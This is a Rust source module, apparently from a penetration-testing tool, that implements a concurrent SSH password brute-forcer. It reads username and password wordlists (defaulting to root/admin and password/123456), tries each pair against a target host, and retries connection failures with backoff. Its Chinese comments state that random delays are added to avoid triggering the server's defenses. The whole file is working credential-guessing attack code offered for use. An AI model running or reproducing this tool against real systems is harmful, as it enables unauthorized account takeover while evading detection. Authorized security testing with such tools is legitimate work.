use crate::handler::brute::{BruteForceResult, BruteForceTask, Protocol, TaskStatus, BruteForceManager};
use std::io::Read;
use std::net::TcpStream;
use std::sync::Arc;
use tokio::sync::{Mutex, Semaphore};
use std::time::{Duration, Instant};
use tokio::time::sleep;
use ssh2::Session;
use futures::future::join_all;
use std::net::ToSocketAddrs;
use rand::Rng;

// SSH暴力破解功能
pub async fn ssh_brute_force(
    task: BruteForceTask,
    manager_state: Arc<Mutex<BruteForceManager>>
) -> Vec<BruteForceResult> {
    let target = task.target.clone();
    let port = task.port;
    let socket_addr_template = format!("{}:{}", target, port);
    let task_id = task.id.unwrap_or(0);
    let num_threads = task.threads.max(1) as usize; // Ensure at least 1 thread

    let usernames = match (task.usernames.clone(), task.username_file.clone()) {
        (Some(names), _) if !names.is_empty() => names,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["root".to_string(), "admin".to_string()],
    };

    let passwords = match (task.passwords.clone(), task.password_file.clone()) {
        (Some(pwds), _) if !pwds.is_empty() => pwds,
        (_, Some(file)) => super::read_wordlist_file(&file).await.unwrap_or_default(),
        _ => vec!["password".to_string(), "123456".to_string()],
    };

    if usernames.is_empty() || passwords.is_empty() {
        return vec![BruteForceResult {
            task_id,
            target,
            protocol: Protocol::SSH,
            username: "".to_string(),
            password: "".to_string(),
            success: false,
            time_taken: 0,
            error: Some("Username or password list is empty".to_string()),
        }];
    }

    let semaphore = Arc::new(Semaphore::new(num_threads));
    let mut spawned_tasks = Vec::new();

    'outer: for username in usernames {
        for password in &passwords {
            // Check if task was stopped externally BEFORE acquiring semaphore and spawning
            {
                let guard = manager_state.lock().await;
                if let Some(current_task_in_manager) = guard.tasks.iter().find(|t| t.id == Some(task_id)) {
                    if current_task_in_manager.status == TaskStatus::Stopped {
                        // If stopped, we might want to wait for already spawned tasks to complete
                        // or try to abort them, though aborting tokio tasks is non-trivial.
                        // For now, we just stop spawning new ones.
                        break 'outer;
                    }
                } else {
                    break 'outer; // Task removed
                }
            } // Mutex guard released

            let permit = match semaphore.clone().acquire_owned().await {
                Ok(p) => p,
                Err(_) => break 'outer, // Semaphore closed, likely an issue or shutdown
            };
            
            let t_socket_addr = socket_addr_template.clone();
            let t_username = username.clone();
            let t_password = password.clone();
            let t_timeout_secs = task.timeout;
            let t_task_id = task_id;
            let t_target_clone = target.clone(); // Clone target for the spawned task
            let t_protocol_clone = task.protocol.clone(); // Clone protocol for the spawned task

            // 增加随机延迟以避免触发服务器防御机制
            let delay_ms = rand::thread_rng().gen_range(10..100);
            sleep(Duration::from_millis(delay_ms)).await;

            spawned_tasks.push(tokio::spawn(async move {
                let start_time = Instant::now();
                
                // 添加重试逻辑
                let max_retries = 2;
                let mut retry_count = 0;
                let mut last_error = None;
                
                while retry_count <= max_retries {
                    match try_ssh_login(&t_socket_addr, &t_username, &t_password, Duration::from_secs(t_timeout_secs)).await {
                        Ok(()) => {
                            let duration = start_time.elapsed().as_millis() as u64;
                            drop(permit);
                            
                            return Some(BruteForceResult {
                                task_id: t_task_id,
                                target: t_target_clone, 
                                protocol: t_protocol_clone, 
                                username: t_username,
                                password: t_password,
                                success: true,
                                time_taken: duration,
                                error: None,
                            });
                        },
                        Err(e) => {
                            // 检查错误类型，对于某些错误不重试（如身份验证失败）
                            if e.contains("Authentication failed") {
                                break; // 不重试明确的认证失败
                            }
                            
                            // 对于连接和握手错误重试
                            if e.contains("handshake") || e.contains("Failed to connect") {
                                retry_count += 1;
                                last_error = Some(e);
                                
                                if retry_count <= max_retries {
                                    // 使用指数退避策略
                                    let backoff_ms = 100 * (2u64.pow(retry_count as u32) - 1);
                                    let jitter_ms = rand::thread_rng().gen_range(10..50);
                                    sleep(Duration::from_millis(backoff_ms + jitter_ms)).await;
                                    continue;
                                }
                            } else {
                                // 其他错误不重试
                                break;
                            }
                        }
                    }
                }
                
                // 所有尝试都失败，或者是认证错误
                drop(permit);
                None // 失败的尝试不返回结果
            }));
        }
    }

    let mut results = Vec::new();
    for task_handle in join_all(spawned_tasks).await {
        match task_handle {
            Ok(Some(result)) => { // Only add if the Option contains a result
                results.push(result);
            }
            Ok(None) => { 
                // Login attempt failed, do nothing as per requirement
            }
            Err(e) => {
                // Log join error, this means a spawned task panicked
                eprintln!("SSH brute force sub-task panicked: {}", e);
                // Do not add a placeholder error result to `results` anymore
            }
        }
    }

    results
}

// 尝试SSH登录
async fn try_ssh_login(addr: &str, username: &str, password: &str, timeout: Duration) -> Result<(), String> {
    let addr_string = addr.to_string();
    let username = username.to_string();
    let password = password.to_string();

    tokio::task::spawn_blocking(move || {
        let socket_address = match addr_string.as_str().to_socket_addrs() {
            Ok(mut iter) => iter.next().ok_or_else(|| format!("No addresses found for {}", addr_string))?,
            Err(e) => return Err(format!("Failed to parse address {}: {}", addr_string, e)),
        };

        let tcp = match std::net::TcpStream::connect_timeout(&socket_address, timeout) {
            Ok(stream) => stream,
            Err(e) => return Err(format!("Failed to connect: {} to {}", e, addr_string)),
        };

        tcp.set_read_timeout(Some(timeout)).map_err(|e| format!("Set read timeout failed: {}", e))?;
        tcp.set_write_timeout(Some(timeout)).map_err(|e| format!("Set write timeout failed: {}", e))?;

        let mut sess = match ssh2::Session::new() {
            Ok(s) => s,
            Err(e) => return Err(format!("Failed to create session: {}", e)),
        };

        sess.set_tcp_stream(tcp);
        sess.set_timeout(timeout.as_millis() as u32); // Set overall session timeout

        if let Err(e) = sess.handshake() {
            return Err(format!("Failed to handshake: {}", e));
        }

        if let Err(e) = sess.userauth_password(&username, &password) {
            return Err(format!("Authentication failed: {}", e));
        }

        if !sess.authenticated() {
            return Err("Authentication failed".to_string());
        }

        Ok(())
    }).await.unwrap_or_else(|e| Err(format!("Task panic: {}", e)))
}

// 从文件读取字典 (已移至 mod.rs)
/*
async fn read_wordlist_file(file_path: &str) -> Result<Vec<String>, String> {
    tokio::fs::read_to_string(file_path)
        .await
        .map(|content| {
            content
                .lines()
                .filter(|line| !line.is_empty())
                .map(|line| line.trim().to_string())
                .collect()
        })
        .map_err(|e| format!("Failed to read wordlist file: {}", e))
} 
*/ 